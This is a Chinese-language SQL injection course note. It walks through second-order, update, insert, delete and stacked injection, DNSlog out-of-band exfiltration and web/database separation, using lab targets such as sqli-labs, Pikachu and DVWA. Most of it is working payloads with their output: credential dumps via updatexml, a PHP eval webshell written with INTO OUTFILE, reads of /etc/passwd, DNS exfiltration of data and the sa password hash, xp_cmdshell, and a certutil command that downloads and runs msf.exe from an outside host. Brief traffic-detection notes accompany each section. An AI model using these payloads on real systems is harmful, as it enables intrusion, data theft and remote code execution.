`%df’` 或者 `%bf’` 宽字节标志流量

#### 其他常见 sql 注入流量

- 联合注入流量：union select
- 盲注流量：and if sleep
- 报错函数流量：updatexml extractvalue floor
- 数据库元信息流量：concat database() information_schema 等



## **二阶注入**

### **1.** **二次注入介绍**

#### **二次注入的概念**

二次注入也有人称它为 SQL **二阶注入**。

二次注入漏洞是一种在 Web 应用程序中广泛存在的安全漏洞形式。相对于一次注入漏洞而言，**二次注入漏洞更难以被发现**，但是它却具有与一次注入攻击漏洞相同的攻击威力。

简单的说，二次注入是指已存储（数据库、文件）的用户输入被读取后再次进入到 SQL 查询语句中导致的注入。

网站对我们输入的一些重要的关键字进行了转义，但是这些我们构造的语句已经写进了数据库，可以在没有被转义的地方使用可能每一次注入都不构成漏洞，但是如果一起用就可能造成注入。 

#### **普通注入与二次注入的区别：**

##### 普通注入：

在 http 后面构造语句，是立即直接生效的一次注入很容易被扫描工具扫描到

##### 二次注入：

先构造语句（有被转义字符的语句），我们构造的恶意语句存入数据库

第二次构造语句（结合前面已经存入数据库的语句，成功。因为系统没有对已经存入数据库的数据做检查），二次注入更加难以被发现

二次注入可以理解为，攻击者构造的恶意数据存储在数据库后，恶意数据被读取并进入到 SQL 查询语句所导致的注入。防御者可能在用户输入恶意数据时对其中的特殊字符进行了转义处理，但在恶意数据插入到数据库时被处理的数据又被还原并存储在数据库中，当 Web 程序调用存储在数据库中的恶意数据并执行 SQL查询时，就发生了 SQL 二次注入。 

#### **二次注入的条件**

1. (1)用户向数据库插入恶意语句(即使后端代码对语句进行了转义，如`mysql_escape_string、mysql_real_escape_string` 转义)

2. (2）数据库对自己存储的数据非常放心，直接取出恶意数据给用户**二次注入步骤**


##### 二次注入，可以概括为以下两步：

###### 第一步：插入恶意数据

进行数据库插入数据时，对其中的特殊字符进行了转义处理，在写入数据库的时候又保留了原来的数据。

###### 第二步：引用恶意数据

开发者默认存入数据库的数据都是安全的，在进行查询时，直接从数据库中取出恶意数据，没有进行进一步的检验的处理。

### **2.** **二次注入代码分析**

首先看注册的代码 `cat login_create.php`

我们可以利用`- -`和`#`做很多事情

再来看修改密码的代码 `pass_change.php`

这里如果修改的 username 是 `admin' -- -` 那么实际上我们修改的是 `admin` 的password

也就是说我们注册了一个 `admin'-- -`这样的一个用户，但修改可以修改 `admin`的密码

### **3.** **二次注入利用**

第一步：注册一个 `admin'-- -`,注意，后面这个-表示前面是一个注释，因为注

释必须是空格才能生效进入到数据库查看

第二步，用 `admin'-- -`用户登录，修改 `admin'-- -`的密码

### **4.** **二次注入危害**

1. (1) 检测需要严密审查代码，很难自动化

2. (2) 二次注入漏洞更难以被发现，但是它却具有与一次注入攻击漏洞相同的攻击威力。


### **5、二次注入的流量分析**

流量检测的时候要多监控注册这种流量，看注册的用户名密码中是否有特殊字符

如：`' -- - #`等

#### less 24

##### 注册

 首先注册一个新的账号，然后登录该账号 

> admin' --+
>
> 123456

![img](../../../../repo/assets/19.SQL注入/1668650181397-1d948aa0-e337-454b-8c7e-f3988e2dae40.png)

##### 登录注册的账号 

![img](../../../../repo/assets/19.SQL注入/1668651240933-a972cf98-6d8b-451b-88d8-1994838d73a2.png)

`admin'-- +`

##### 登录修改密码

 登录之后，修改密码，

该修改密码功能的语句变为  

```bash
UPDATE users SET PASSWORD='$pass' where username='admin'-- +'and password='$curr_pass'
```

那么真正奏效的语句则是

```bash
UPDATE users SET PASSWORD='$pass' WHERE username='admin'
```

 这时候我们就是在进行越权改变管理员的密码，

从数据库中抽出我们注册的新账户，用该账户越权修改 管理员的密码  

![img](../../../../repo/assets/19.SQL注入/1668651533559-bc5112bd-3656-49d1-af60-a80f5a8b4cb0.png)

将密码改为**1234**，

Password successfully updated

> admin
>
> 1234

##### 登录管理员的账户

然后用管理员的账户，登录密码1234  

![img](../../../../repo/assets/19.SQL注入/1668651459102-54e393e7-5449-4f4c-acb4-a55b8fbcd7f8.png)

 管理员账户登录成功  

## **Update 注入及流量分析**

### **1. Mysql update** **语句复习**

update 语句可用来修改表中的数据，简单来说基本的使用形式为:

> update 表名称 set 列名称=新值 where 更新条件;
>

```
UPDATE table_name SET field1=new-value1, field2=new-value2 [WHEREClause]
```

#### Update 语句练习

修改 security 数据库 users 表的 admin 字段的值为 000000

### **2. Update** **注入代码分析**

```
$update="UPDATE users SET password = '$passwd' WHERE username='$row1'";
```



```
UPDATE users SET password = 'Dumb' WHERE username='Dumb';
UPDATE users SET password = 'I-kill-you' WHERE username='Angelina';
UPDATE users SET password = 'p@ssword' WHERE username='Dummy';
UPDATE users SET password = 'crappy' WHERE username='secure';
UPDATE users SET password = 'stupidity' WHERE username='stupid';
UPDATE users SET password = 'genious' WHERE username='superman';
UPDATE users SET password = 'mob!le' WHERE username='batman';
UPDATE users SET password = 'admin' WHERE username='admin';
UPDATE users SET password = 'admin1' WHERE username='admin1';
UPDATE users SET password = 'admin2' WHERE username='admin2';
UPDATE users SET password = 'admin3' WHERE username='admin3';
UPDATE users SET password = 'dumbo' WHERE username='dhakkan';
UPDATE users SET password = 'admin4' WHERE username='admin4';
```

### **3. Mysql update** **手工注入演示**

#### less-17

##### 版本

```
http://192.168.70.14:8088/Less-17/

uname=admin&passwd=admin' or updatexml(1,concat(0x7e,version(),0x7e),1)#&submit=Submit
```

![image-20240808145603341](../../../../repo/assets/19.SQL注入/image-20240808145603341.png)

##### 数据库名

```
uname=admin&passwd=admin' and updatexml(1,concat(0x7e,(select database()),0x7e),1)-- +
```

![image-20240808145640649](../../../../repo/assets/19.SQL注入/image-20240808145640649.png)

##### 表名

```
uname=admin&passwd=1' and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1) -- +
```

![image-20240808145713649](../../../../repo/assets/19.SQL注入/image-20240808145713649.png)

##### 字段名

```
uname=admin&passwd=1' and updatexml(1,concat(0x7e,(select (column_name) from information_schema.columns where table_name='users' limit 0,1),0x7e),1) -- +
```

![image-20240808145759317](../../../../repo/assets/19.SQL注入/image-20240808145759317.png)

##### 字段值

```
uname=admin&passwd=1' and updatexml(1,concat(0x7e,substring((select group_concat(concat(username,'^',password)) from users),1,31),0x7e),1)-- +
```

使用报错注入回显用户名和密码，发现网页回显 “`You can't specify target table 'users' for update in FROM clause`”。

![image-20240808151742972](../../../../repo/assets/19.SQL注入/image-20240808151742972.png)

这里我们无法直接从 users 表拿数据，我们可以先用一个表暂存从 users 表中取出所有数据的查询，然后再从这个暂存的表中取出数据。构造出的 payload 如下，思路就是利用一个查询从另一个查询中取出数据，以此绕过表的限制。

```
uname=admin&passwd=1' and updatexml(1,concat(0x7e,substring((select group_concat(concat(username,0x3a,password)) from 
(SELECT username,password FROM users)x),1,32),0x7e),1)-- +
```

![image-20240808164953786](../../../../repo/assets/19.SQL注入/image-20240808164953786.png)

### **4. Sqlmap** **安全测试**

利用 sqlmap 读取 target.txt 中的内容并指定 passwd 参数进行 SQL 注入漏洞的

利用。

target 文件内容

```
sqlmap -r target.txt -p passwd
```



```
sqlmap -u http://192.168.70.14:8088/Less-17/ --data -p passwd
```



### **5.** **流量分析**

探测流量`’ \ ’ and 1=1` 等

利用流量

盲注流量

报错函数流量等

Sqlmap 流量



## **Insert 注入及流量分析**

### **一、注入原理**:

inset 注入就是指我们前端注册的信息会被后台通过 insert 操作插入到数据库里

边去，若此时后台没有做出相应的处理就会构成 insert 注入。 

### **二、注入方法**:

#### insert 语句

```
insert into member(username,pw,sex.phonenum,email,address) values('xxxxx',111111,1,1,1,1,);
```

以上是 Insert 的完整语句，而我们输入的用户名对应的就是上面‘xxxxx’这里，

这里我们可以使用 `or` 这个逻辑运算符，例如用下面的语句代替 xxxxx：

```
x' or updatexml(1,concat(0x7e,version()),0) or '
```

#### Pikachu 网站练习

http://192.168.70.10:8083/vul/sqli/sqli_iu/sqli_login.php

![image-20240808173603388](../../../../repo/assets/19.SQL注入/image-20240808173603388.png)

http://192.168.70.10:8083/vul/sqli/sqli_iu/sqli_reg.php

![image-20240808173624813](../../../../repo/assets/19.SQL注入/image-20240808173624813.png)

##### 数据库名

```
http://192.168.70.10:8083/vul/sqli/sqli_iu/sqli_reg.php

add=&email=&password=123&phonenum=&sex=&submit=submit&username=123' and updatexml(1,concat(0x7e,database(),0x7e),1) and '
```

`pikachu`

![image-20240808173729474](../../../../repo/assets/19.SQL注入/image-20240808173729474.png)

##### 表名

```
add=&email=&password=123&phonenum=&sex=&submit=submit&username=123' and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database() limit 0,1),0x7e),1)  and '
```

`httpinfo`,`member`,`message`,`users`,`xssblind`

![image-20240808195649139](../../../../repo/assets/19.SQL注入/image-20240808195649139.png)

##### 字段名

```
add=&email=&password=123&phonenum=&sex=&submit=submit&username=123' and updatexml(1,concat(0x7e,(select (column_name) from information_schema.columns where table_name='users' and table_schema=database() limit 0,1),0x7e),1)  and '
```

`id`,`username`,`password`,`level`

![image-20240808200234520](../../../../repo/assets/19.SQL注入/image-20240808200234520.png)

##### 字段值

```
add=&email=&password=123&phonenum=&sex=&submit=submit&username=123' and updatexml(1,concat(0x7e,substring((select group_concat(concat(username,'^',password)) from users),1,31),0x7e),1)  and '
```

> e10adc3949ba59abbe56e057f20f883e
>
> 123456
>
> admin/123456
>
> 
>
> 670b14728ad9902aecba32e22fa4f6bd
>
> 000000
>
> pikachu/000000
>
> 
>
> e99a18c428cb38d5f260853678922e03
>
> abc123
>
> test/abc123

![image-20240808200755514](../../../../repo/assets/19.SQL注入/image-20240808200755514.png)



#### less 18 ua头

```
$insert="INSERT INTO `security`.`uagents` (`uagent`, `ip_address`,`username`) VALUES ('$uagent', '$IP', $uname)";
```

`User-Agent`

##### 数据库名

```mysql
1',1,updatexml(1,concat(0x7e,database(),0x7e),1))#
```

![image-20240806141306109](../../../../repo/assets/19.SQL注入/image-20240806141306109.png)

不能像常规的报错盲注一样直接上，我们得考虑一下闭合VALUES，假如我们利用的点是$uagent，那构建格式就应该是`1',1,1)#`，在SQL语句中相当于

```mysql
INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES ('1',1,1)#, '$IP', $uname)
```

> Your IP ADDRESS is: 192.168.70.14
>
> Your User Agent is: 1',1,updatexml(1,concat(0x7e,database(),0x7e),1))#
>
> XPATH syntax error: '`~security~`'

##### 表名

```mysql
1',1,updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema = database()),0x7e),1))#
```

![image-20240806141348574](../../../../repo/assets/19.SQL注入/image-20240806141348574.png)

##### 字段名

```mysql
1',1, updatexml(1,concat(0x7e,(select (column_name) from information_schema.columns where table_name='users' limit 0,1),0x7e),1)) -- +
```

![image-20240806141558662](../../../../repo/assets/19.SQL注入/image-20240806141558662.png)

##### 字段值

```mysql
1',1, updatexml(1,concat(0x7e,(select username from users limit 0,1),0x7e),1)) -- +
```

![image-20240806141732704](../../../../repo/assets/19.SQL注入/image-20240806141732704.png)





### **三、流量分析**

- 报错函数流量

- 盲注流量

- 单引号闭合 

- or

- Sqlmap 流量




## **Delete 注入及流量分析**

### 一、注入原理:

对于后台来说，delete 就是把留言对应的 id 传到了后台，然后后台就把该 id 对应的数据给删除了，

```
$query="delete from message where id={$_GET['id']}";
```



### 二、注入方法:

#### "delete"注入

http://192.168.70.10:8083/vul/sqli/sqli_del.php

![image-20240808201635221](../../../../repo/assets/19.SQL注入/image-20240808201635221.png)

##### burpsuite抓包

![image-20240808201925333](../../../../repo/assets/19.SQL注入/image-20240808201925333.png)

在id 后面注入,id 是**数值型**，所以不用加单引号

##### 版本

```
http://192.168.70.10:8083/vul/sqli/sqli_del.php?id=61 or updatexml(1,concat(0x7e,version(),0x7e),1)
```

![image-20240808202944947](../../../../repo/assets/19.SQL注入/image-20240808202944947.png)

注入字符串 url 编码

##### 数据库名

```
http://192.168.70.10:8083/vul/sqli/sqli_del.php?id=61+or+updatexml(1,concat(0x7e,database(),0x7e),1)
```

![image-20240808203735389](../../../../repo/assets/19.SQL注入/image-20240808203735389.png)

##### 表名

```
http://192.168.70.10:8083/vul/sqli/sqli_del.php?id=61+or+updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database() limit 0,1),0x7e),1)
```

`httpinfo`,`member`,`message`,`users`,`xssblind`

![image-20240808205045417](../../../../repo/assets/19.SQL注入/image-20240808205045417.png)

##### 字段名

```
http://192.168.70.10:8083/vul/sqli/sqli_del.php?id=61+or+updatexml(1,concat(0x7e,(select (column_name) from information_schema.columns where table_name='users' and table_schema=database() limit 0,1),0x7e),1)
```

`id`,`username`,`password`,`level`

![image-20240808204229295](../../../../repo/assets/19.SQL注入/image-20240808204229295.png)

##### 字段值

```
http://192.168.70.10:8083/vul/sqli/sqli_del.php?id=61+or+updatexml(1,concat(0x7e,substring((select group_concat(concat(username,'^',password)) from users),1,31),0x7e),1)
```

> admin / 123456
>
> pikachu / 000000
>
> test / abc123

![image-20240808204359886](../../../../repo/assets/19.SQL注入/image-20240808204359886.png)

### **三、流量分析**

盲注流量

报错函数流量



## **堆叠注入**

### **1、堆叠注入定义**

Stacked injections(堆叠注入)从名词的含义就可以看到应该是一堆 sql 语句(多条)一起执行。而在真实的运用中也是这样的,我们知道在 mysql 中, 主要是命令行中,每一条语句结尾加；表示语句结束。这样我们就想到了是不是可以多句一起使用。这个叫做 `stacked  injection`。

### **2**、堆叠注入原理

在 SQL 中，分号(;)是用来表示一条 sql 语句的结束。试想一下我们在；结束一个 sql 语句后继续构造下一条语句，会不会一起执行？因此这个想法也就造就了堆叠注入。而 union injection(联合注入)也是将两条语句合并在一起，

两者之间有什么区别么？区别就在于 union 或者 union all 执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。例如以下这个例子。

用户输入：`1；DELETE FROM products`

服务器端生成的 sql 语句为：

```
select * from users where productid=1;DELETE FROM users
```

当执行查询后，第一条显示查询信息，第二条则将整个表进行删除。

堆叠注入的局限性在于并不是每一个环境下都可以执行,虽然我们前面提到了堆叠查询可以执行任意的 sql 语句，但是这种注入方式并不是十分的完美的。

在我们的 web 系统中，因为代码通常只返回一个查询结果，因此，堆叠注入第二个语句产生错误或者结果只能被忽略，我们在前端界面是无法看到返回结果的。

因此，在读取数据时，我们建议使用 union（联合）注入。同时在使用堆叠注入之前，我们也是需要知道一些数据库相关信息的，例如表名，列名等信息。

### **3**、堆叠注入演示

 **mysqli_multi_query()**这个函数可以实现针对数据库一条或多多条数据的操作

这就导致可能产生**堆叠注入**的存在，

堆叠注入可以实现**数据的增删改查**，木马的写入，甚至直接破坏,升格数据库

#### Less-38

首先看 id 为 1 的用户信息然后发送堆叠注入

##### update 修改用户密码

```
http://192.168.70.14:8088/Less-38/?id=1';update users set password='Dumb' where username='Dumb'; --+
```

![image-20240809092949799](../../../../repo/assets/19.SQL注入/image-20240809092949799.png)

##### insert 插入用户

```
http://192.168.70.14:8088/Less-38/?id=1'; insert into users(username,password)values('duidie','duidiezhuru')--+  
```

> duidie / duidiezhuru

![image-20240809093018129](../../../../repo/assets/19.SQL注入/image-20240809093018129.png)

##### select 查询用户

```
http://192.168.70.14:8088/Less-38/?id=-1' union select 1,2,(select group_concat(username,0x7e,password)from users)--+
```

`duidie / duidiezhuru`

![image-20240809093110865](../../../../repo/assets/19.SQL注入/image-20240809093110865.png)

##### delete 删除用户

```
http://192.168.70.14:8088/Less-38/?id=1'; delete from users where username='duidie';--+ 
```

![image-20240809093226252](../../../../repo/assets/19.SQL注入/image-20240809093226252.png)

已删除`duidie`用户

![image-20240809093254171](../../../../repo/assets/19.SQL注入/image-20240809093254171.png)

##### 写入webshell

```
http://192.168.70.14:8088/Less-38/?id=1'; select '<?php @eval($_POST["xxx"]);?>' into outfile "/var/www/html/test.php";
```

![image-20240809094643987](../../../../repo/assets/19.SQL注入/image-20240809094643987.png)

![image-20240809094725541](../../../../repo/assets/19.SQL注入/image-20240809094725541.png)

###### 蚁剑连接

```
http://192.168.70.14:8088/test.php
xxx
```

![image-20240809094818306](../../../../repo/assets/19.SQL注入/image-20240809094818306.png)

![image-20240809095015927](../../../../repo/assets/19.SQL注入/image-20240809095015927.png)

##### 读取文件

```
http://192.168.70.14:8088/Less-38/?id=-1' union select 1,2,load_file('/etc/passwd') --+
```

![image-20240809095544651](../../../../repo/assets/19.SQL注入/image-20240809095544651.png)



### **4**、流量分析

Sql 语句的堆叠流量

破坏语句堆叠



## **Sql 注入无回显，盲注又被封怎么办？**

### **1**、**Sql **注入无回显怎么办？

我们可以采用盲注，基于时间的盲注，基于布尔值的盲注

### **2**、**sql盲注被封了怎么办？**

盲注，这种注入速度非常慢，需要一个一个字符猜解，需要像服务器发送的大量请求，

而且很容易被网站 WAF 或者防火墙 BAN 掉 IP，虽然也可以使用代理 IP 池，但是还是需要一

种快速有效的方法来获取数据。此时我们就可以利用 DNSlog 来快速的获取回显数据。

### **3**、DNSLog**平台**

#### **（1）DNS 解析过程**

#### **（**2）UNC

UNC 是一种命名惯例, 主要用于在 Microsoft Windows 上指定和映射网络驱动器.。UNC命名惯例最多被应用于在局域网中访问文件服务器或者打印机。我们日常常用的网络共享文件就是这个方式。UNC 路径就是类似\softer 这样的形式的网络路径

格式： `\servername\sharename` ，其中 servername 是服务器名，sharename 是共享资源的名称。

目 录 或 文 件 的 UNC 名 称 可 以 包 括 共 享 名 称 下 的 目 录 路 径 ， 格 式 为 ：

> \servername\sharename\directory\filename

#### **（**3）查询 DNS 解析记录来获得命令执行的回显**

##### DNSLog 部署过程：

申请一个域名，如 `wasj.com`

在我们的 VPS 上安装并配置 DNS 服务器将 wasj.com 的 DNS 服务器设置为我们的 VPS 地址这样，所有访问 wasj.com 的二级三级四级等等子域名都会被解析到我们的 VPS 上。

我们就可以通过查询 DNS 解析记录来获得命令执行的回显了。

但是由于部署非常麻烦，所以我们可以通过一些在线的 DNSLog 平台：

#####  DNSLog 平台

http://ceye.io

http://www.dnslog.cn

http://dnslog.pw/dns/

### **4**、 **Sql** **注入盲注的** **DNSlog** **利用条件**

-  DBMS 中需要有可用的，能直接或间接引发 DNS 解析过程的子程序，即使用到 UNC
-  Linux 没有 UNC 路径，所以当处于 Linux 中的数据库管理系统时，不能使用该方式获取数据



> 1s5a2k.ceye.io
>
> oaj0hp.dnslog.cn
>
> fantasycat.dnslog.pw

## **不同的数据库系统利用** **dnslog** **的姿势**

### **一、**Mysql

使用 `load_file`

范例：**windows** 操作系统中的 mysql ，需要设置 `secure_file_priv` 为空，这个条件比较苛刻

##### 版本

```
select load_file(concat('\\\\',(select version()),'.fantasycat.dnslog.pw\\test'));
```

![image-20240809104637734](../../../../repo/assets/19.SQL注入/image-20240809104637734.png)

![image-20240809104654690](../../../../repo/assets/19.SQL注入/image-20240809104654690.png)

##### 数据库名

```
select load_file(concat('\\\\',(select database()),'.fantasycat.dnslog.pw\\test'));
```

![image-20240809105428160](../../../../repo/assets/19.SQL注入/image-20240809105428160.png)

##### 表名

```
select load_file(concat('\\\\',(select table_name from information_schema.tables where table_schema='security'  limit 0,1),'.fantasycat.dnslog.pw\\test'));
```

`emails`

![image-20240809110708005](../../../../repo/assets/19.SQL注入/image-20240809110708005.png)

##### 字段名

```
select load_file(concat('\\\\',(select column_name from information_schema.columns where table_name='users' and table_schema='security' limit 0,1),'.fantasycat.dnslog.pw\\test'));
```

`id`

![image-20240809110817004](../../../../repo/assets/19.SQL注入/image-20240809110817004.png)

##### 字段值

```
select load_file(concat('\\\\',(select concat(username,'.',password) from users limit 0,1),'.fantasycat.dnslog.pw\\test'));
```

`dumb.dumb`

![image-20240809111025576](../../../../repo/assets/19.SQL注入/image-20240809111025576.png)

### **二、SQL-Server**

#### Microsoft SQL Server 使用如下存储过程

> `Master..xp_dirtree` (用于获取所有文件夹的列表和给定文件夹内部的子文件夹）
>
> `master…xp_fileexist` (用于确定一个特定的文件是否存在于硬盘)
>
> `master…xp_subdirs` (用于得到给定的文件夹内的文件夹列表)

##### Master..xp_dirtree

###### 数据库名

```mssql
declare @a varchar(50);
select @a='\\'+convert(varchar(50),DB_NAME())+'.fantasycat.dnslog.pw\abc';
print @a;
exec master..xp_dirtree @a,1,1;
```

![image-20240809122401949](../../../../repo/assets/19.SQL注入/image-20240809122401949.png)

![image-20240809122329762](../../../../repo/assets/19.SQL注入/image-20240809122329762.png)

###### sa密码

```mssql
DECLARE @a varchar(1024);
SELECT @a=(SELECT TOP 1 master.dbo.fn_varbintohexstr(password_hash) FROM sys.sql_logins WHERE name='sa')+'.fantasycat.dnslog.pw';
EXEC('master..xp_dirtree "\\'+@a+'\abc$"');
```

> 0x010056049b0eab9f69e564bca929ac053ad61d3b8ce0a6104e7b
>
> sa / abc123!@#

![image-20240809123809594](../../../../repo/assets/19.SQL注入/image-20240809123809594.png)

##### master..xp_fileexist

```mssql
declare @a varchar(50);
select @a='\\'+convert(varchar(50),DB_NAME())+'.fantasycat.dnslog.pw\test1';
print @a;
exec master..xp_fileexist @a;
```

![image-20240809122709842](../../../../repo/assets/19.SQL注入/image-20240809122709842.png)

![image-20240809122532169](../../../../repo/assets/19.SQL注入/image-20240809122532169.png)

##### master..xp_subdirs

```
declare @a varchar(50);
select @a='\\'+convert(varchar(50),db_name())+'.fantasycat.dnslog.pw\demo';
print @a;
exec master..xp_subdirs @a;
```

![image-20240809122817451](../../../../repo/assets/19.SQL注入/image-20240809122817451.png)

![image-20240809122746408](../../../../repo/assets/19.SQL注入/image-20240809122746408.png)



## **Sql** **注入利用** **dnslog** **带回回显信息的一个完****整的栗子及流量分析**

### **一、一个列子**

####  `dvwa` 盲注

#####  **数据库名**

```
http://192.168.70.10:8085/vulnerabilities/sqli_blind/?id=' and if((select load_file(concat('\\\\',(select database()),'.fantasycat.dnslog.pw\\hguone'))),1,0)#
```

![image-20240809112103968](../../../../repo/assets/19.SQL注入/image-20240809112103968.png)

![image-20240809111947619](../../../../repo/assets/19.SQL注入/image-20240809111947619.png)

#####  **表名**

```
http://192.168.70.10:8085/vulnerabilities/sqli_blind/?id=' and if((select load_file(concat('\\\\',(select table_name from information_schema.tables where table_schema='dvwa' limit 0,1),'.fantasycat.dnslog.pw\\hguone'))),1,0)#

' and if((select load_file(concat('\\\\',(select table_name from information_schema.tables where table_schema='dvwa' limit 1,1),'.fantasycat.dnslog.pw\\hguone'))),1,0)#
```

![image-20240809112319312](../../../../repo/assets/19.SQL注入/image-20240809112319312.png)

`guestbook`

![image-20240809112349818](../../../../repo/assets/19.SQL注入/image-20240809112349818.png)

`users`

![image-20240809112514418](../../../../repo/assets/19.SQL注入/image-20240809112514418.png)

#####  **字段名**

```
' and if((select load_file(concat('\\\\',(select column_name from information_schema.columns where table_name='users' limit 0,1),'.fantasycat.dnslog.pw\\hguone'))),1,0)#
```

`user_id`

![image-20240809112635931](../../../../repo/assets/19.SQL注入/image-20240809112635931.png)

#####  **字段值**

```
' and if((select load_file(concat('\\\\',(select concat(user,'.',password) from users limit 0,1),'.fantasycat.dnslog.pw\\hguone'))),1,0)#
```

> admin.5f4dcc3b5aa765d61d8327deb882cf99

![image-20240809112731343](../../../../repo/assets/19.SQL注入/image-20240809112731343.png)

### **二、注意事项**

1. 1、解析的地址如果通过 UNC 命名规则设置，UNC 命名资源查找，会触发 dns 解析输出 log，由于 linux 没有 UNC，所以就只适用于 windows DNS 解析过程中。但是并不意味着 linux 不适用 dnslog，比如用 ping，用 curl 是可以的。
2. 2、UNC 路径不能超过 128，否则报错，这限制了比如 sql 的查询语句的长度。
3. 3、SQL 中像 load_file 这类函数使用需要当前账户有读权限。

### **三、性能分析**

### **四、流量分析**

1. 1、load_file 函数 或者 sql-server 存储过程
2. 2、开源 Dnslog 平台的二级域名或者自定义 dnslog 平台的二级域名
3. 3、获得数据库源信息的函数或者存储过程等

## 站库分离

### **1、**何为站库分离？

站库分离其实就是管理员将网站程序和数据库分别放在了不同的内网服务器上，这样看似提高了数据安全性，但是如果网站存在漏洞，攻击者还是有可能以Web或Data为入口访问到内网数据库服务器中的数据。

这种情况大多出现在内网环境，不过也有少部分管理员会使用公网数据库，如：自建公网数据库、Amazon/阿里/腾讯/华为RDS云数据库等，并设置允许连接该数据库的白名单IP地址。

![img](../../../../repo/assets/19.SQL注入/wps1.jpg)

 

### **2、** **站库分离渗透入口**

#### **(1) Web入口渗透**

通过网站的各种漏洞来Getshell，如：文件上传、文件包含、命令执行、代码执行、SQL注入写入一句话（Into outfile、日志备份）等，在获得Webshell权限或者有诸如文件读取等漏洞时，我们可以读数据库配置文件、对数据库内容分析、查找数据库备份，进而对内网数据库服务器进行渗透。

#### **(2) Data入口渗透**

从数据库入口渗透同样是为了获取更大的权限，或者扩展我们的渗透成果。比如从这台数据库服务器中可以得到网站和数据库的一些用户、密码等信息，在后续的内网渗透中可以很有效的帮助我们。

通过外网暴露的数据库弱口令、反编译或嗅探C/S客户端以及Web网站SQL注入漏洞等，在获得数据库账户密码或者利用sqlmap进入到os-shell、sql-shell，这时我们不能写入Webshel，因为这台数据库服务器中没有Web环境，但可以通过以下方式来做信息搜集和获取权限，先拿到这台数据库服务器权限，然后再尝试对Web服务器和内网其他主机进行渗透。

 

### **3、**站库分离判断方法

#### **(1) 网络连接状态**

通过Netstat命令查看MSSQL数据库`1433`端口的网络连接状态，可以看到与当前MSSQL数据库服务器`192.168.3.14`建立连接的只有`192.168.3.252`，由此可以判断这台主机为Web服务器。

```
netstat -ano | findstr "1433"
```

![img](../../../../repo/assets/19.SQL注入/wps2.jpg)

#### **(2) 数据库配置文件**

通过网站程序数据库置文件来判断是否站库分离，如果数据库IP地址是`localhost`、`127.0.0.1`或当前**主机内网IP**则说明为同服务器，反之则可能为**站库分离**，自建公网数据库和RDS云数据库除外。

![img](../../../../repo/assets/19.SQL注入/wps3.jpg)

 

#### **(3) MySQL内置函数和库**

通过MySQL的@@hostname内置函数可以查看服务端主机名称，`information_schema`内置库的`PROCESSLIST`可以定位到当前已连接数据库的用户名、主机和端口号等信息，

- Windows连接格式：**主机名:Port**，
- Linux连接格式：`IP:Port`，
- 本地连接格式：`localhost:Port`

```
SELECT @@hostname;      //服务端主机名称

select * from information_schema.PROCESSLIST;   //客户端主机名称和端口
```

![img](../../../../repo/assets/19.SQL注入/wps4.jpg)

##### 站库分离

![img](../../../../repo/assets/19.SQL注入/wps5.jpg)

web服务器和数据库服务器放在一台服务器里。

![img](../../../../repo/assets/19.SQL注入/wps6.jpg)

  

也可以通过load_file()这个内置函数读取一些敏感文件，如：hosts文件中解析的一些内网业务的IP地址和域名，IIS/Apache/Nginx/Tomcat/Jboss/Weblogic/Websphere的相关配置文件以及网卡信息等。

```
select load_file('C:/Windows/System32/drivers/etc/hosts');
```

![img](../../../../repo/assets/19.SQL注入/wps7.jpg)

```
/etc/hosts/etc/apache2/apache2.conf/etc/httpd/conf/httpd.conf/etc/udev/rules.d/70-persistent-net.rules      //获取网卡名称
/etc/network/interfaces               //DHCP或静态IP
/var/lib/dhclient/dhclient--网卡.lease       //DHCP
/etc/sysconfig/network-scripts/ifcfg-网卡      //静态IP

C:/Windows/System32/drivers/etc/hostsC:/Windows/system32/inetsrv/MetaBase.xml
C:/Windows/System32/inetsrv/config/applicationHost.config
C:/phpStudy/Apache/conf/httpd.conf
C:/phpStudy/Apache/conf/vhosts.conf
C:/phpStudy/PHPTutorial/Apache/conf/httpd.conf
C:/phpStudy/PHPTutorial/Apache/conf/vhosts.conf
C:/phpStudy/PHPTutorial/nginx/conf/nginx.conf
C:/phpStudy/PHPTutorial/nginx/conf/vhosts.conf[...SNIP...]
```

![img](../../../../repo/assets/19.SQL注入/wps8.jpg)

![img](../../../../repo/assets/19.SQL注入/wps9.jpg)

 

#### **(4) MSSQL内置函数和表**

通过MSSQL的host_name()、@@servername和serverproperty几个内置函数来判断是否站库分离，如果客户端与服务端返回的主机名不一样则说明为站库分离，返回的主机名一样则说明可能为同服务器。

```
select HOST_NAME();             //客户端主机名称

select @@SERVERNAME;           //服务端主机名称select serverproperty('MachineName');   //服务端主机名称
```

![img](../../../../repo/assets/19.SQL注入/wps10.jpg 

![img](../../../../repo/assets/19.SQL注入/wps11.jpg)



![img](../../../../repo/assets/19.SQL注入/wps12.jpg)

也可以通过MSSQL的sysprocesses系统表来判断是否站库分离，它的功能类似于MySQL中的PROCESSLIST，可以定位到当前已连接到sqlinject数据库的用户名和主机名等信息。

 

有时会有内网多台Web服务器同时连接一台数据库服务器中的不同数据库，这时我们就可以利用这种方式来查看连接到某数据库的用户名和主机名等信息，然后使用Ping主机名得到这台Web服务器的内网IP地址。

```
select from master.sys.sysdatabases;
select * from master.sys.sysprocesses where dbid=db_id('sqlinject');

exec master..xp_cmdshell 'cmd /c ping test-b479ef6ec0';
```

![img](../../../../repo/assets/19.SQL注入/wps13.jpg)

 

![img](../../../../repo/assets/19.SQL注入/wps14.jpg)

 

还可以直接通过以下MSSQL注入语句来判断是否站库分离，news必须为数据库中存在的表名，当然用其他存在的表名也是可以的，如果注入页面返回不正常则说明为站库分离，反之则为同服务器。

```
and exists(select * from news where 1=(SELECT (case when host_name()=@@servername then 1 else 0 end)))

SELECT (case when host_name()=@@servername then 1 else 0 end)
```

![img](../../../../repo/assets/19.SQL注入/wps15.jpg)

  

![img](../../../../repo/assets/19.SQL注入/wps16.jpg)

 

### **4、**站库分离利用思路

#### **(1) 下载远程文件**

目标主机允许通外网时我们可以利用`Vbs/Ftp/IPC$/Certutil/Bitsadmin/Powershell`等方式来下载远程文件到**可读写目录**中，然后再去执行一下即可。

```
certutil -urlcache -split -f http://155.*.*.229:8888/msf.exe C:\ProgramData\msf.exeC:\ProgramData\msf.exe
```

![img](../../../../repo/assets/19.SQL注入/wps17.jpg)

